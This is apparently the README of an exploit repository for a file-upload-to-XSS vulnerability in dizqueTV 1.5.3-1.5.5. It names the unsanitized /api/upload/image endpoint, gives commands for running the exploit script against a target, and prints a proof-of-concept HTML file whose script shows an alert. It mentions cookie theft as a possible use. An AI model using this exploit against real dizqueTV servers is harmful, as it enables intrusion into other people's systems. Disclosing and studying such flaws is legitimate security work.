# dizqueTV File Upload to XSS Exploit

## Overview
This exploit targets a file upload vulnerability in **dizqueTV** versions 1.5.3-1.5.5. Due to insufficient sanitization in the file upload API, an attacker can upload arbitrary files, enabling potential **Cross-Site Scripting (XSS)** attacks. This exploit leverages the vulnerability to upload a crafted HTML file with embedded JavaScript.

**Exploit Author**: J3rich0123  
**Tested on**: Linux  
**Vendor**: [dizqueTV GitHub Repository](https://github.com/vexorian/dizquetv)  
**Version**: 1.5.3-1.5.5 (Required)  
**CVE**: N/A

## Vulnerable Component
The vulnerability resides in the file upload endpoint at `/api/upload/image`, which does not sanitize file contents or enforce strict file type restrictions. This allows the upload of files containing malicious code.

## Exploit Details
The exploit script creates and uploads an HTML file with a JavaScript-based XSS payload. Once uploaded, this payload can trigger on pages that render the file, potentially allowing the attacker to perform actions like cookie theft or redirection.

## Usage
### Prerequisites
- Python 3.x
- `requests` library

To install the required library:
```bash
pip install requests
```

Exploit Execution

Clone this repository.

Execute the exploit with the target URL as an argument:

```bash
python exploit.py <target_url>
```

Example usage:

```bash
python exploit.py http://localhost:8000/api/upload/image
```

Upon success, youâ€™ll see confirmation messages indicating the file upload was successful.

Note: If the file renders in a browser with JavaScript enabled, the XSS alert will be triggered.

Example Output
plaintext

Reading malicious file: xss.html
Uploading malicious file: xss.html
Exploit successful! Attempted to upload: xss.html
Server response: (Server response message here)
PoC HTML Payload
The xss.html payload file created by this exploit contains:

    <meta charset="UTF-8">
    <title>XSS Payload</title>
    <script>alert("Hacked!!!");</script>
</head>
<body>
    <h1>Testing XSS Payload</h1>
    <p>If the alert shows, the XSS attack was successful!</p>
</body>
</html>
```
Remediation
This vulnerability has been reported to the vendor, and a patch will be released in the next version. The patch will address file type sanitization and restrictions.
